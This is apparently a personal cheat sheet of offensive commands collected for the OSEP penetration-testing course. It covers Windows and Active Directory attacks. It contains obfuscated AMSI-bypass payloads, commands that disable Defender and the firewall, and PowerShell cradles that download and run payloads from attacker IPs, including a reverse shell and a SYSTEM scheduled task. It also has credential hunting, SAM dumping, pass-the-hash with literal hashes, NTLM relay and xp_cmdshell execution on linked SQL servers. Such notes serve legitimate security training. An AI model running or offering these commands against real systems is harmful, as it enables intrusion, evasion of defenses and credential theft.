Just a bunch of tools built/gathered along the OSEP course, it's time to prepare for the battle.

- [1. Tunneling](#Tunneling)
- [2. Map The Network](#Map-The-Network)
- [3. AMSI-Bypass](#AMSI-Bypass)
- [4. Privilege Escalation](#Privilege-Escalation)
  [5. Kill Defender](#Kill-Defender)
- [6. Useful Basic Commands](#Useful-Basic-Commands)
- [7. Escalate to SYSTEM via Schduele Task](#Escalate-to-SYSTEM-via-Schduele-Task)
- [8. Enable RDP and RestrictedAdmin](#Enable-RDP-and-RestrictedAdmin)
- [9. TCP Port Redirection via powercat.ps1](#TCP-Port-Redirection-via-powercat.ps1)
- [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
- [11. MSSQLPwner](#MSSQLPwner)


# Tunneling

Make sure to convert agent.exe of ligolo to shellcode: 
- `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 

Make sure you are running as x64 bit process before running: 
- Powershell - `[Environment]::Is64BitProcess`
- CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64) 

Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`


# Map The Network
- `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)

- `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)

Automation for `/etc/hosts` file: 
```
netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && cat hosts.txt | awk '{print $9,$11,$11"."$21}' | sed 's/(domain://g' | sed 's/)//g' | uniq | sort -u | tr '[:upper:]' '[:lower:]' | sudo tee -a /etc/hosts
```

# Privilege Escalation
- `Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`

# AMSI-Bypass

- Windows 10/11:
```
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```
- Windows 10:
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
```
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```

# Kill Defender

```
netsh advfirewall set allprofiles state off
Firewall rules netsh advfirewall firewall show rule name=all
Add-MpPreference -ExclusionExtension ".exe"
Set-MpPreference -DisableRealtimeMonitoring $true
```


# Useful Basic Commands

### Run command as another user:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

- `runas.exe /netonly /user:final.com\nina cmd.exe`

### Set up SMB server (file transfer):
- `smbserver.py share $(pwd) -smb2support -username amit -password password` 

- On Victim: `net use \\192.168.45.223\share /U:amit password` 

- Copy files: `copy <FILENAME> \\192.168.45.223\share`

# Enumeration

Search for SSH keys in Users directory:
- `Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }`

Search for interesting files:
- `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`

Powershell History Path:
- `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Sticky Notes Path:
- `C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`

# Enable RDP and RestrictedAdmin
*Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*

Using command prompt: 

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable
``` 

Using netexec:
```
netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec
```

### RDP to host:
- Password Auth: `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
- NTLM Auth: `xfreerdp /v:172.16.231.221 /u:amit /pth:'<NTLM HASH>' +dynamic-resolution +clipboard`

### atexec.py

- `atexec.py test.local/john:password123@10.10.10.1 whoami'`
- `atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami`

# Escalate to SYSTEM via Schduele Task
- `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`

- `schtasks /run /tn "SystemTask"`

### Dump SAM (Make sure session is running with SYSTEM privileges)
- Background the meterpreter session with `bg`.
- `use post/windows/gather/hashdump`
- `set SESSION <Session Number>`
- `run`

# TCP Port Redirection via powercat.ps1

Mostly be used for NTLM Relay attacks when the authentication cannot reach our attacking machine, so the idea is to redirect it from a random host in the network (where we have admin privileges) to our attacking machine.

first step is to allow inbound and outbound connections to our victim machine on port 445:

### Using CMD:
```
netsh advfirewall firewall add rule name="Allow Port 445 Inbound" dir=in action=allow protocol=TCP localport=445
netsh advfirewall firewall add rule name="Allow Port 445 Outbound" dir=out action=allow protocol=TCP remoteport=445
```

### Using Powershell:
```
New-NetFirewallRule -DisplayName "Allow Port 445 Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow
New-NetFirewallRule -DisplayName "Allow Port 445 Outbound" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Allow
```

Now, we will need to disable the SMB port on the victim: 

*Note: Run one by one in CMD, no powershell!)*

    1. sc config LanmanServer start= disabled
    2. sc stop LanmanServer
    3. sc stop srv2
    4. sc stop srvnet

Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
- `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`

Once it's running we can check if the victim is listening on port 445: `netstat -anto | findstr 445`

Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to the victim machine! and see the callback to our machine on port 445 tunneled from the victim!

# MSSQL Useful Queries
*Note: privileges in a database might differ, check every access you can accomplish, which mean using the local administrator, machine account, etc.*

List databases:
- `select * from sys.databases;`

List tables inside specific database:
- `select * from <DATABASE NAME>..sysobjects WHERE xtype = 'U';`

List columns inside specific table :
- `select * from wordpress..wp_users;`

Update specific column:
- `update wordpress..wp_users set user_pass = '$P$BAyzjPk37CdiX/e/XxwB9I7wZgBG8Q/' WHERE user_login = 'admin';`

Impersonate SA on linked server and execute commands:
```
-- Switch to sa only if needed
EXECUTE AS LOGIN = 'sa';
EXEC('sp_configure ''show advanced options'',1; RECONFIGURE') AT SQL03;
exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
```

# MSSQLPwner
Enumerate an MSSQL instance:
- `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`

### NTLM Relay:
*Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*

Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command here'`

SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`

Fire up responder: `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)

Perform the attack: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`


